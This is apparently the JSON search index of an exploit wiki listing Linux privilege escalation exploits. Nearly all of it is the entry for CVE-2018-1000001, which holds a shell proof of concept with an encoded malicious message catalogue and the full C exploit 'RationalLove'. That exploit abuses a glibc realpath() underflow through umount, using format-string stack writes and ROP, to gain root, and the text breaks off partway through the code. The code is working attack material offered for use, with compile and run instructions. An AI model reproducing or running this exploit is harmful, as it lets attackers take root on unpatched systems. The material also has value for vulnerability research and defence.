{
    "docs": [
        {
            "location": "/",
            "text": "linux userspace LPE\n\n\n\n\nglibc - 'realpath()' Privilege Escalation\n\n\nVim < 8.1.1365 / Neovim < 0.3.6 - Arbitrary Code Execution\n\n\nrunc < 1.0-rc6 (Docker < 18.09.2) - Container Breakout\n\n\n\n\nlinux kernelspace LPE\n\n\n*",
            "title": "Home"
        },
        {
            "location": "/#linux-userspace-lpe",
            "text": "glibc - 'realpath()' Privilege Escalation  Vim < 8.1.1365 / Neovim < 0.3.6 - Arbitrary Code Execution  runc < 1.0-rc6 (Docker < 18.09.2) - Container Breakout",
            "title": "linux userspace LPE"
        },
        {
            "location": "/#linux-kernelspace-lpe",
            "text": "*",
            "title": "linux kernelspace LPE"
        },
        {
            "location": "/acknowledgements/",
            "text": "Acknowledgements\n\n\nThe expwiki Team would like to thank the following people and parties for participating this project.\n\n\n\n\nchengjia4574@gmail.com from IceSwordLab\n\n\ninvincible1944@gmail.com from IceSwordLab",
            "title": "Acknowledgements"
        },
        {
            "location": "/acknowledgements/#acknowledgements",
            "text": "The expwiki Team would like to thank the following people and parties for participating this project.   chengjia4574@gmail.com from IceSwordLab  invincible1944@gmail.com from IceSwordLab",
            "title": "Acknowledgements"
        },
        {
            "location": "/cve-2018-1000001-01/",
            "text": "cve-2018-1000001\u9644\u4ef6\n\n\npoc\u6e90\u7801\n\n\n# Line 1\nroot$ echo 1 > /proc/sys/kernel/unprivileged_userns_clone\n# Line 2-5\n/usr/bin/unshare -m -U --map-root-user /bin/bash\nmount -t tmpfs tmpfs /tmp\ncd /tmp\nchmod 00755 .\n\n\n# Line 6-9\nmkdir -p -- \"(unreachable)/tmp\" \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES\" \"(unreachable)/x\"\nln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A \"(unreachable)/tmp/down\"\nbase64 -d <<B64-EOF | bzip2 -cd > \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES/util-linux.mo\"\nQlpoOTFBWSZTWTOfm9IAAGX/pn6UlARGB+FeKyZnAD/n3mACAAAgAAEgAJSIqfkpspk0eUGJ6gAG\nmQeoaD1PJAamlPJGCNMTIaNGmnqMQ0AAzSwpEWpQICVUw+490ohZBgZ+s4EBAZCn/TavSQshtCiv\niG6HOehyAp4FPt3zkpdTxNchTYITLBkXUjsgpN2QDBNX8qmbpkVgfLXKcQc1ZhVF0FxUQOtnbGlL\n5NhRmORwmQF1Dw3Yu1mds6tGAmnLwWwc2KRKGl5hcLuSKcKEgZz83pA=\nB64-EOF\necho \"$$\"\n2299\n\n\n# Line 10-11\ntest$ cd /proc/2299/cwd\ntest$ LC_ALL=C.UTF-8 /bin/umount --lazy down /\numount: AAlnAAAAAAAAAAA\n\n\n\n\n\n\nexp\u6e90\u7801\n\n\n/** This software is provided by the copyright owner \"as is\"\n *  and without any expressed or implied warranties, including,\n *  but not limited to, the implied warranties of merchantability\n *  and fitness for a particular purpose are disclaimed. In no\n *  event shall the copyright owner be liable for any direct,\n *  indirect, incidential, special, exemplary or consequential\n *  damages, including, but not limited to, procurement of substitute\n *  goods or services, loss of use, data or profits or business\n *  interruption, however caused and on any theory of liability,\n *  whether in contract, strict liability, or tort, including\n *  negligence or otherwise, arising in any way out of the use\n *  of this software, even if advised of the possibility of such\n *  damage.\n *\n *  Copyright (c) 2018 halfdog <me (%) halfdog.net>\n *  See https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/ for more information.\n *\n *  This tool exploits a buffer underflow in glibc realpath()\n *  and was tested against latest release from Debian, Ubuntu\n *  Mint. It is intended as demonstration of ASLR-aware exploitation\n *  techniques. It uses relative binary offsets, that may be different\n *  for various Linux distributions and builds. Please send me\n *  a patch when you developed a new set of parameters to add\n *  to the osSpecificExploitDataList structure and want to contribute\n *  them.\n *\n *  Compile: gcc -o RationalLove RationalLove.c\n *  Run: ./RationalLove\n *\n *  You may also use \"--Pid\" parameter, if you want to test the\n *  program on already existing namespaced or chrooted mounts.\n *\n *  Revisions:\n *  * 20180722: Fixed escalation failure on Xenial desktop install\n *    related to definition of \"/\" in \"/run/mount/utab\". Also\n *    fixed compiler warnings.\n */\n\n\n#define _GNU_SOURCE\n#include <assert.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <limits.h>\n#include <poll.h>\n#include <sched.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mount.h>\n#include <sys/stat.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <unistd.h>\n\n\n\n\n#define UMOUNT_ENV_VAR_COUNT 256\n\n\n/** Dump that number of bytes from stack to perform anti-ASLR.\n *  This number should be high enough to reproducible reach the\n *  stack region sprayed with (UMOUNT_ENV_VAR_COUNT*8) bytes of\n *  environment variable references but low enough to avoid hitting\n *  upper stack limit, which would cause a crash.\n */\n#define STACK_LONG_DUMP_BYTES 4096\n\n\nchar *messageCataloguePreamble=\"Language: en\\n\"\n    \"MIME-Version: 1.0\\n\"\n    \"Content-Type: text/plain; charset=UTF-8\\n\"\n    \"Content-Transfer-Encoding: 8bit\\n\";\n\n\n/** The pid of a namespace process with the working directory\n *  at a writable /tmp only visible by the process. */\npid_t namespacedProcessPid=-1;\n\n\nint killNamespacedProcessFlag=1;\n\n\n/** The pathname to the umount binary to execute. */\nchar *umountPathname;\n\n\n/** The pathname to the named pipe, that will synchronize umount\n *  binary with supervisory process before triggering the second\n *  and last exploitation phase.\n */\nchar *secondPhaseTriggerPipePathname;\n\n\n/** The pathname to the second phase exploitation catalogue file.\n *  This is needed as the catalogue cannot be sent via the trigger\n *  pipe from above.\n */\nchar *secondPhaseCataloguePathname;\n\n\n/** The OS-release detected via /etc/os-release. */\nchar *osRelease=NULL;\n\n\n/** This table contains all relevant information to adapt the\n *  attack to supported Linux distros (fully updated) to support\n *  also older versions, hash of umount/libc/libmount should be\n *  used also for lookups.\n *  The 4th string is an array of 4-byte integers, that are addressed\n *  using the \"ED_...\" constants.\n */\n// Stack offset of libmount ctx pointer when addressing it via\n// printf format string argument skipping syntax, thus causing\n// 8 byte words to be skipped when incrementing by one.\n#define ED_STACK_OFFSET_CTX 0\n// Format string argument skipping for argv array.\n#define ED_STACK_OFFSET_ARGV 1\n// Format string argument skipping for argv[0].\n#define ED_STACK_OFFSET_ARG0 2\n// Delta of getdate() function from __libc_start_main position\n// after return from main().\n#define ED_LIBC_GETDATE_DELTA 3\n// Delta of execl() function from __libc_start_main ...\n#define ED_LIBC_EXECL_DELTA 4\nstatic char* osSpecificExploitDataList[]={\n// Debian Stretch\n    \"\\\"9 (stretch)\\\"\",\n    \"../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A\",\n    \"__gconv_find_shlib\",\n    \"\\x06\\0\\0\\0\\x24\\0\\0\\0\\x3e\\0\\0\\0\\x7f\\xb9\\x08\\x00\\xef\\x85\\x09\\x00\",\n    NULL};\n\n\nchar **osReleaseExploitData=NULL;\n\n\n/** Locate the umount binary within the given search path list,\n *  elements separated by colons.\n *  @return a pointer to a malloced memory region containing the\n *  string or NULL if not found.\n */\nchar* findUmountBinaryPathname(char *searchPath) {\n  char *testPathName=(char*)malloc(PATH_MAX);\n  assert(testPathName);\n\n\n  while(*searchPath) {\n    char *endPtr=strchr(searchPath, ':');\n    int length=endPtr-searchPath;\n    if(!endPtr) {\n      length=strlen(searchPath);\n      endPtr=searchPath+length-1;\n    }\n    int result=snprintf(testPathName, PATH_MAX, \"%.*s/%s\", length,\n        searchPath, \"umount\");\n    if(result>=PATH_MAX) {\n      fprintf(stderr, \"Binary search path element too long, ignoring it.\\n\");\n    } else {\n      struct stat statBuf;\n      result=stat(testPathName, &statBuf);\n// Just assume, that umount is owner-executable. There might be\n// alternative ACLs, which grant umount execution only to selected\n// groups, but it would be unusual to have different variants\n// of umount located searchpath on the same host.\n      if((!result)&&(S_ISREG(statBuf.st_mode))&&(statBuf.st_mode&S_IXUSR)) {\n        return(testPathName);\n      }\n    }\n    searchPath=endPtr+1;\n  }\n\n\n  free(testPathName);\n  return(NULL);\n}\n\n\n\n\n/** Get the value for a given field name.\n *  @return NULL if not found, a malloced string otherwise.\n */\nchar* getReleaseFileField(char *releaseData, int dataLength, char *fieldName) {\n  int nameLength=strlen(fieldName);\n  while(dataLength>0) {\n    char *nextPos=memchr(releaseData, '\\n', dataLength);\n    int lineLength=dataLength;\n    if(nextPos) {\n      lineLength=nextPos-releaseData;\n      nextPos++;\n    } else {\n      nextPos=releaseData+dataLength;\n    }\n    if((!strncmp(releaseData, fieldName, nameLength))&&\n        (releaseData[nameLength]=='=')) {\n      return(strndup(releaseData+nameLength+1, lineLength-nameLength-1));\n    }\n    releaseData=nextPos;\n    dataLength-=lineLength;\n  }\n  return(NULL);\n}\n\n\n\n\n/** Detect the release by reading the VERSION field from /etc/os-release.\n *  @return 0 on success.\n */\nint detectOsRelease() {\n  int handle=open(\"/etc/os-release\", O_RDONLY);\n  if(handle<0)\n    return(-1);\n\n\n  char *buffer=alloca(1024);\n  int infoLength=read(handle, buffer, 1024);\n  close(handle);\n  if(infoLength<0)\n    return(-1);\n  osRelease=getReleaseFileField(buffer, infoLength, \"VERSION\");\n  if(!osRelease)\n    osRelease=getReleaseFileField(buffer, infoLength, \"NAME\");\n  if(osRelease) {\n    fprintf(stderr, \"Detected OS version: %s\\n\", osRelease);\n    return(0);\n  }\n\n\n  return(-1);\n}\n\n\n\n\n/** Create the catalogue data in memory.\n *  @return a pointer to newly allocated catalogue data memory\n */\nchar* createMessageCatalogueData(char **origStringList, char **transStringList,\n    int stringCount, int *catalogueDataLength) {\n  int contentLength=strlen(messageCataloguePreamble)+2;\n  for(int stringPos=0; stringPos<stringCount; stringPos++) {\n    contentLength+=strlen(origStringList[stringPos])+\n        strlen(transStringList[stringPos])+2;\n  }\n  int preambleLength=(0x1c+0x14*(stringCount+1)+0xc)&-0xf;\n  char *catalogueData=(char*)malloc(preambleLength+contentLength);\n  memset(catalogueData, 0, preambleLength);\n  int *preambleData=(int*)catalogueData;\n  *preambleData++=0x950412de;\n  preambleData++;\n  *preambleData++=stringCount+1;\n  *preambleData++=0x1c;\n  *preambleData++=(*(preambleData-2))+(stringCount+1)*sizeof(int)*2;\n  *preambleData++=0x5;\n  *preambleData++=(*(preambleData-3))+(stringCount+1)*sizeof(int)*2;\n\n\n  char *nextCatalogueStringStart=catalogueData+preambleLength;\n  for(int stringPos=-1; stringPos<stringCount; stringPos++) {\n    char *writeString=(stringPos<0)?\"\":origStringList[stringPos];\n    int length=strlen(writeString);\n    *preambleData++=length;\n    *preambleData++=(nextCatalogueStringStart-catalogueData);\n    memcpy(nextCatalogueStringStart, writeString, length+1);\n    nextCatalogueStringStart+=length+1;\n  }\n  for(int stringPos=-1; stringPos<stringCount; stringPos++) {\n    char *writeString=(stringPos<0)?messageCataloguePreamble:transStringList[stringPos];\n    int length=strlen(writeString);\n    *preambleData++=length;\n    *preambleData++=(nextCatalogueStringStart-catalogueData);\n    memcpy(nextCatalogueStringStart, writeString, length+1);\n    nextCatalogueStringStart+=length+1;\n  }\n  assert(nextCatalogueStringStart-catalogueData==preambleLength+contentLength);\n  for(int stringPos=0; stringPos<=stringCount+1; stringPos++) {\n//    *preambleData++=(stringPos+1);\n    *preambleData++=(int[]){1, 3, 2, 0, 4}[stringPos];\n  }\n  *catalogueDataLength=preambleLength+contentLength;\n  return(catalogueData);\n}\n\n\n\n\n/** Create the catalogue data from the string lists and write\n *  it to the given file.\n *  @return 0 on success.\n */\nint writeMessageCatalogue(char *pathName, char **origStringList,\n    char **transStringList, int stringCount) {\n  int catalogueFd=open(pathName, O_WRONLY|O_CREAT|O_TRUNC|O_NOCTTY, 0644);\n  if(catalogueFd<0) {\n    fprintf(stderr, \"Failed to open catalogue file %s for writing.\\n\",\n        pathName);\n    return(-1);\n  }\n  int catalogueDataLength;\n  char *catalogueData=createMessageCatalogueData(\n      origStringList, transStringList, stringCount, &catalogueDataLength);\n  int result=write(catalogueFd, catalogueData, catalogueDataLength);\n  assert(result==catalogueDataLength);\n  close(catalogueFd);\n  free(catalogueData);\n  return(0);\n}\n\n\nvoid createDirectoryRecursive(char *namespaceMountBaseDir, char *pathName) {\n  char pathBuffer[PATH_MAX];\n  int pathNameLength=0;\n  while(1) {\n    char *nextPathSep=strchr(pathName+pathNameLength, '/');\n    if(nextPathSep) {\n      pathNameLength=nextPathSep-pathName;\n    } else {\n      pathNameLength=strlen(pathName);\n    }\n    int result=snprintf(pathBuffer, sizeof(pathBuffer), \"%s/%.*s\",\n        namespaceMountBaseDir, pathNameLength, pathName);\n    assert(result<PATH_MAX);\n    result=mkdir(pathBuffer, 0755);\n    assert((!result)||(errno==EEXIST));\n    if(!pathName[pathNameLength])\n      break;\n    pathNameLength++;\n  }\n}\n\n\n\n\n/** This child function prepares the namespaced mount point and\n *  then waits to be killed later on.\n */\nstatic int usernsChildFunction() {\n  while(geteuid()!=0) {\n    sched_yield();\n  }\n  int result=mount(\"tmpfs\", \"/tmp\", \"tmpfs\", MS_MGC_VAL, NULL);\n  assert(!result);\n  assert(!chdir(\"/tmp\"));\n  int handle=open(\"ready\", O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_NOCTTY, 0644);\n  assert(handle>=0);\n  close(handle);\n  sleep(100000);\n}\n\n\n/** Prepare a process living in an own mount namespace and setup\n *  the mount structure appropriately. The process is created\n *  in a way allowing cleanup at program end by just killing it,\n *  thus removing the namespace.\n *  @return the pid of that process or -1 on error.\n */\npid_t prepareNamespacedProcess() {\n  if(namespacedProcessPid==-1) {\n    fprintf(stderr, \"No pid supplied via command line, trying to create a namespace\\nCAVEAT: /proc/sys/kernel/unprivileged_userns_clone must be 1 on systems with USERNS protection.\\n\");\n\n\n    char *stackData=(char*)malloc(1<<20);\n    assert(stackData);\n    namespacedProcessPid=clone(usernsChildFunction, stackData+(1<<20),\n        CLONE_NEWUSER|CLONE_NEWNS|SIGCHLD, NULL);\n    if(namespacedProcessPid==-1) {\n      fprintf(stderr, \"USERNS clone failed: %d (%s)\\n\", errno, strerror(errno));\n      return(-1);\n    }\n\n\n    char idMapFileName[128];\n    char idMapData[128];\n    sprintf(idMapFileName, \"/proc/%d/setgroups\", namespacedProcessPid);\n    int setGroupsFd=open(idMapFileName, O_WRONLY);\n    assert(setGroupsFd>=0);\n    int result=write(setGroupsFd, \"deny\", 4);\n    assert(result>0);\n    close(setGroupsFd);\n\n\n    sprintf(idMapFileName, \"/proc/%d/uid_map\", namespacedProcessPid);\n    int uidMapFd=open(idMapFileName, O_WRONLY);\n    assert(uidMapFd>=0);\n    sprintf(idMapData, \"0 %d 1\\n\", getuid());\n    result=write(uidMapFd, idMapData, strlen(idMapData));\n    assert(result>0);\n    close(uidMapFd);\n\n\n    sprintf(idMapFileName, \"/proc/%d/gid_map\", namespacedProcessPid);\n    int gidMapFd=open(idMapFileName, O_WRONLY);\n    assert(gidMapFd>=0);\n    sprintf(idMapData, \"0 %d 1\\n\", getgid());\n    result=write(gidMapFd, idMapData, strlen(idMapData));\n    assert(result>0);\n    close(gidMapFd);\n\n\n// After setting the maps for the child process, the child may\n// start setting up the mount point. Wait for that to complete.\n    sleep(1);\n    fprintf(stderr, \"Namespaced filesystem created with pid %d\\n\",\n        namespacedProcessPid);\n  }\n\n\n//   osReleaseExploitData=osSpecificExploitDataList;\n//   if(osRelease) {\n// // If an OS was detected, try to find it in list. Otherwise use\n// // default.\n//     for(int tPos=0; osSpecificExploitDataList[tPos]; tPos+=4) {\n//       if(!strcmp(osSpecificExploitDataList[tPos], osRelease)) {\n//         osReleaseExploitData=osSpecificExploitDataList+tPos;\n//         break;\n//       }\n//     }\n//   }\n  osReleaseExploitData = osSpecificExploitDataList;\n\n\n  char pathBuffer[PATH_MAX];\n  int result=snprintf(pathBuffer, sizeof(pathBuffer), \"/proc/%d/cwd\",\n     namespacedProcessPid);\n  assert(result<PATH_MAX);\n  char *namespaceMountBaseDir=strdup(pathBuffer);\n  assert(namespaceMountBaseDir);\n\n\n// Create directories needed for umount to proceed to final state\n// \"not mounted\".\n  createDirectoryRecursive(namespaceMountBaseDir, \"(unreachable)/x\");\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES\", osReleaseExploitData[2]);\n  assert(result<PATH_MAX);\n  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"(unreachable)/tmp/%s/X.X/LC_MESSAGES\", osReleaseExploitData[2]);\n  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"(unreachable)/tmp/%s/X.x/LC_MESSAGES\", osReleaseExploitData[2]);\n  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);\n\n\n// Create symlink to trigger underflows.\n  result=snprintf(pathBuffer, sizeof(pathBuffer), \"%s/(unreachable)/tmp/down\",\n      namespaceMountBaseDir);\n  assert(result<PATH_MAX);\n  result=symlink(osReleaseExploitData[1], pathBuffer);\n  assert(!result||(errno==EEXIST));\n\n\n// getdate will leave that string in rdi to become the filename\n// to execute for the next round.\n  char *selfPathName=realpath(\"/proc/self/exe\", NULL);\n  result=snprintf(pathBuffer, sizeof(pathBuffer), \"%s/DATEMSK\",\n      namespaceMountBaseDir);\n  assert(result<PATH_MAX);\n  int handle=open(pathBuffer, O_WRONLY|O_CREAT|O_TRUNC, 0755);\n  assert(handle>0);\n  result=snprintf(pathBuffer, sizeof(pathBuffer), \"#!%s\\nunused\",\n      selfPathName);\n  assert(result<PATH_MAX);\n  result=write(handle, pathBuffer, result);\n  close(handle);\n  free(selfPathName);\n\n\n// Write the initial message catalogue to trigger stack dumping\n// and to make the \"umount\" call privileged by toggling the \"restricted\"\n// flag in the context.\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"%s/(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES/util-linux.mo\",\n      namespaceMountBaseDir, osReleaseExploitData[2]);\n  assert(result<PATH_MAX);\n\n\n  char *stackDumpStr=(char*)malloc(0x80+6*(STACK_LONG_DUMP_BYTES/8));\n  assert(stackDumpStr);\n  char *stackDumpStrEnd=stackDumpStr;\n  stackDumpStrEnd+=sprintf(stackDumpStrEnd, \"AA%%%d$lnAAAAAA\",\n      ((int*)osReleaseExploitData[3])[ED_STACK_OFFSET_CTX]);\n  for(int dumpCount=(STACK_LONG_DUMP_BYTES/8); dumpCount; dumpCount--) {\n    memcpy(stackDumpStrEnd, \"%016lx\", 6);\n    stackDumpStrEnd+=6;\n  }\n// We wrote allready 8 bytes, write so many more to produce a\n// count of 'L' and write that to the stack. As all writes so\n// sum up to a count aligned by 8, and 'L'==0x4c, we will have\n// to write at least 4 bytes, which is longer than any \"%hhx\"\n// format string output. Hence do not care about the byte content\n// here. The target write address has a 16 byte alignment due\n// to varg structure.\n  stackDumpStrEnd+=sprintf(stackDumpStrEnd, \"%%1$%dhhx%%%d$hhn\",\n      ('L'-8-STACK_LONG_DUMP_BYTES*2)&0xff,\n      STACK_LONG_DUMP_BYTES/16);\n  *stackDumpStrEnd=0;\n  result=writeMessageCatalogue(pathBuffer,\n      (char*[]){\n          \"%s: mountpoint not found\",\n          \"%s: not mounted\",\n          \"%s: target is busy\\n        (In some cases useful info about processes that\\n         use the device is found by lsof(8) or fuser(1).)\"\n      },\n      (char*[]){\"1234\", stackDumpStr, \"5678\"},\n      3);\n  assert(!result);\n  free(stackDumpStr);\n\n\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"%s/(unreachable)/tmp/%s/X.X/LC_MESSAGES/util-linux.mo\",\n      namespaceMountBaseDir, osReleaseExploitData[2]);\n  assert(result<PATH_MAX);\n  result=mknod(pathBuffer, S_IFIFO|0666, S_IFIFO);\n  assert((!result)||(errno==EEXIST));\n  secondPhaseTriggerPipePathname=strdup(pathBuffer);\n\n\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"%s/(unreachable)/tmp/%s/X.x/LC_MESSAGES/util-linux.mo\",\n      namespaceMountBaseDir, osReleaseExploitData[2]);\n  secondPhaseCataloguePathname=strdup(pathBuffer);\n\n\n  free(namespaceMountBaseDir);\n  return(namespacedProcessPid);\n}\n\n\n\n\n\n\n/** Create the format string to write an arbitrary value to the\n *  stack. The created format string avoids to interfere with\n *  the complex fprintf format handling logic by accessing fprintf\n *  internal state on stack. Thus the modification method does\n *  not depend on that ftp internals. The current libc fprintf\n *  implementation copies values for formatting before applying\n *  the %n writes, therefore pointers changed by fprintf operation\n *  can only be utilized with the next fprintf invocation. As\n *  we cannot rely on a stack having a suitable number of pointers\n *  ready for arbitrary writes, we need to create those pointers\n *  one by one. Everything needed is pointer on stack pointing\n *  to another valid pointer and 4 helper pointers pointing to\n *  writeable memory. The **argv list matches all those requirements.\n *  @param printfArgvValuePos the position of the argv pointer from\n *  printf format string view.\n *  @param argvStackAddress the address of the argv list, where\n *  the argv[0] pointer can be read.\n *  @param printfArg0ValuePos the position of argv list containing\n *  argv[0..n] pointers.\n *  @param mainFunctionReturnAddress the address on stack where\n *  the return address from the main() function to _libc_start()\n *  is stored.\n *  @param writeValue the value to write to mainFunctionReturnAddress\n */\nvoid createStackWriteFormatString(\n    char *formatBuffer, int bufferSize, int printfArgvValuePos,\n    void *argvStackAddress, int printfArg0ValuePos,\n    void *mainFunctionReturnAddress, unsigned short *writeData,\n    int writeDataLength) {\n  int result=0;\n  int currentValue=-1;\n  for(int nextWriteValue=0; nextWriteValue<0x10000;) {\n// Find the lowest value to write.\n    nextWriteValue=0x10000;\n    for(int valuePos=0; valuePos<writeDataLength; valuePos++) {\n       int value=writeData[valuePos];\n       if((value>currentValue)&&(value<nextWriteValue))\n         nextWriteValue=value;\n    }\n    if(currentValue<0)\n      currentValue=0;\n    if(currentValue!=nextWriteValue) {\n      result=snprintf(formatBuffer, bufferSize, \"%%1$%1$d.%1$ds\",\n          nextWriteValue-currentValue);\n      formatBuffer+=result;\n      bufferSize-=result;\n      currentValue=nextWriteValue;\n    }\n    for(int valuePos=0; valuePos<writeDataLength; valuePos++) {\n       if(writeData[valuePos]==nextWriteValue) {\n          result=snprintf(formatBuffer, bufferSize,\n              \"%%%d$hn\", printfArg0ValuePos+valuePos+1);\n          formatBuffer+=result;\n          bufferSize-=result;\n       }\n    }\n  }\n\n\n// Print the return function address location number of bytes\n// except 8 (those from the LABEL counter) and write the value\n// to arg1.\n  int writeCount=((long long)mainFunctionReturnAddress-18)&0xffff;\n  result=snprintf(formatBuffer, bufferSize,\n      \"%%1$%d.%ds%%1$s%%1$s%%%d$hn\",\n      writeCount, writeCount, printfArg0ValuePos);\n  formatBuffer+=result;\n  bufferSize-=result;\n\n\n// Write the LABEL 6 more times, thus multiplying the the single\n// byte write pointer to an 8-byte aligned argv-list pointer and\n// update argv[0] to point to argv[1..n].\n  writeCount=(((long long)argvStackAddress)-(writeCount+56))&0xffff;\n  result=snprintf(formatBuffer, bufferSize,\n      \"%%1$s%%1$s%%1$s%%1$s%%1$s%%1$s%%1$%d.%ds%%%d$hn\",\n      writeCount, writeCount, printfArgvValuePos);\n  formatBuffer+=result;\n  bufferSize-=result;\n\n\n// Append a debugging preamble.\n  result=snprintf(formatBuffer, bufferSize, \"-%%35$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%78$s\\n\",\n      printfArgvValuePos, printfArg0ValuePos-1, printfArg0ValuePos,\n      printfArg0ValuePos+1, printfArg0ValuePos+2, printfArg0ValuePos+3,\n      printfArg0ValuePos+4, printfArg0ValuePos+5, printfArg0ValuePos+6);\n  formatBuffer+=result;\n  bufferSize-=result;\n}\n\n\n\n\n/** Wait for the trigger pipe to open. The pipe will be closed\n *  immediately after opening it.\n *  @return 0 when the pipe was opened before hitting a timeout.\n */\nint waitForTriggerPipeOpen(char *pipeName) {\n  struct timespec startTime, currentTime;\n  int result=clock_gettime(CLOCK_MONOTONIC, &startTime);\n  startTime.tv_sec+=10;\n  assert(!result);\n  while(1) {\n    int pipeFd=open(pipeName, O_WRONLY|O_NONBLOCK);\n    if(pipeFd>=0) {\n      close(pipeFd);\n      break;\n    }\n    result=clock_gettime(CLOCK_MONOTONIC, &currentTime);\n    if(currentTime.tv_sec>startTime.tv_sec) {\n      return(-1);\n    }\n    currentTime.tv_sec=0;\n    currentTime.tv_nsec=100000000;\n    nanosleep(&currentTime, NULL);\n  }\n  return(0);\n}\n\n\n\n\n/** Invoke umount to gain root privileges.\n *  @return 0 if the umount process terminated with expected exit\n *  status.\n */\nint attemptEscalation() {\n  int escalationSuccess=-1;\n\n\n  char targetCwd[64];\n  snprintf(\n      targetCwd, sizeof(targetCwd)-1, \"/proc/%d/cwd\", namespacedProcessPid);\n\n\n  int pipeFds[2];\n  int result=pipe(pipeFds);\n  assert(!result);\n\n\n  pid_t childPid=fork();\n  assert(childPid>=0);\n  if(!childPid) {\n// This is the child process.\n    close(pipeFds[0]);\n    fprintf(stderr, \"Starting subprocess\\n\");\n    dup2(pipeFds[1], 1);\n    dup2(pipeFds[1], 2);\n    close(pipeFds[1]);\n    result=chdir(targetCwd);\n    assert(!result);\n\n\n// Create so many environment variables for a kind of \"stack spraying\".\n    int envCount=UMOUNT_ENV_VAR_COUNT;\n    char **umountEnv=(char**)malloc((envCount+1)*sizeof(char*));\n    assert(umountEnv);\n    umountEnv[envCount--]=NULL;\n    umountEnv[envCount--]=\"LC_ALL=C.UTF-8\";\n    while(envCount>=0) {\n      umountEnv[envCount--]=\"AANGUAGE=X.X\";\n    }\n// Use the built-in C locale.\n// Invoke umount first by overwriting heap downwards using links\n// for \"down\", then retriggering another error message (\"busy\")\n// with hopefully similar same stack layout for other path \"/run\".\n// The path \"/\" cannot be used as it is registered in \"/run/mount/utab\"\n// on standard desktop Xenial installs, thus triggering different\n// code path.\n    char* umountArgs[]={umountPathname, \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"down\", \"LABEL=78\", \"LABEL=789\", \"LABEL=789a\", \"LABEL=789ab\", \"LABEL=789abc\", \"LABEL=789abcd\", \"LABEL=789abcde\", \"LABEL=789abcdef\", \"LABEL=789abcdef0\", \"LABEL=789abcdef0\", NULL};\n    result=execve(umountArgs[0], umountArgs, umountEnv);\n    assert(!result);\n  }\n  close(pipeFds[1]);\n  int childStdout=pipeFds[0];\n\n\n  int escalationPhase=0;\n  char readBuffer[1024];\n  int readDataLength=0;\n  char stackData[STACK_LONG_DUMP_BYTES];\n  int stackDataBytes=0;\n\n\n  struct pollfd pollFdList[1];\n  pollFdList[0].fd=childStdout;\n  pollFdList[0].events=POLLIN;\n\n\n// Now learn about the binary, prepare data for second exploitation\n// phase. The phases should be:\n// * 0: umount executes, glibc underflows and causes an util-linux.mo\n//   file to be read, that contains a poisonous format string.\n//   Successful poisoning results in writing of 8*'A' preamble,\n//   we are looking for to indicate end of this phase.\n// * 1: The poisoned process writes out stack content to defeat\n//   ASLR. Reading all relevant stack end this phase.\n// * 2: The poisoned process changes the \"LANGUAGE\" parameter,\n//   thus triggering re-read of util-linux.mo. To avoid races,\n//   we let umount open a named pipe, thus blocking execution.\n//   As soon as the pipe is ready for writing, we write a modified\n//   version of util-linux.mo to another file because the pipe\n//   cannot be used for sending the content.\n// * 3: We read umount output to avoid blocking the process and\n//   wait for it to ROP execute fchown/fchmod and exit.\n  while(1) {\n    if(escalationPhase==2) {\n// We cannot use the standard poll from below to monitor the pipe,\n// but also we do not want to block forever. Wait for the pipe\n// in nonblocking mode and then continue with next phase.\n      result=waitForTriggerPipeOpen(secondPhaseTriggerPipePathname);\n      if(result) {\n        goto attemptEscalationCleanup;\n      }\n      escalationPhase++;\n    }\n\n\n// Wait at most 10 seconds for IO.\n    result=poll(pollFdList, 1, 10000);\n    if(!result) {\n// We ran into a timeout. This might be the result of a deadlocked\n// child, so kill the child and retry.\n      fprintf(stderr, \"Poll timed out\\n\");\n      goto attemptEscalationCleanup;\n    }\n// Perform the IO operations without blocking.\n    if(pollFdList[0].revents&(POLLIN|POLLHUP)) {\n      result=read(\n          pollFdList[0].fd, readBuffer+readDataLength,\n          sizeof(readBuffer)-readDataLength);\n      if(!result) {\n        if(escalationPhase<3) {\n// Child has closed the socket unexpectedly.\n          goto attemptEscalationCleanup;\n        }\n        break;\n      }\n      if(result<0) {\n        fprintf(stderr, \"IO error talking to child\\n\");\n        goto attemptEscalationCleanup;\n      }\n      readDataLength+=result;\n\n\n// Handle the data depending on escalation phase.\n      int moveLength=0;\n      switch(escalationPhase) {\n        case 0: // Initial sync: read A*8 preamble.\n          if(readDataLength<8)\n            continue;\n          char *preambleStart=memmem(readBuffer, readDataLength,\n              \"AAAAAAAA\", 8);\n          if(!preambleStart) {\n// No preamble, move content only if buffer is full.\n            if(readDataLength==sizeof(readBuffer))\n              moveLength=readDataLength-7;\n            break;\n          }\n// We found, what we are looking for. Start reading the stack.\n          escalationPhase++;\n          moveLength=preambleStart-readBuffer+8;\n        case 1: // Read the stack.\n// Consume stack data until or local array is full.\n          while(moveLength+16<=readDataLength) {\n            result=sscanf(readBuffer+moveLength, \"%016lx\",\n                (long*)(stackData+stackDataBytes));\n            if(result!=1) {\n// Scanning failed, the data 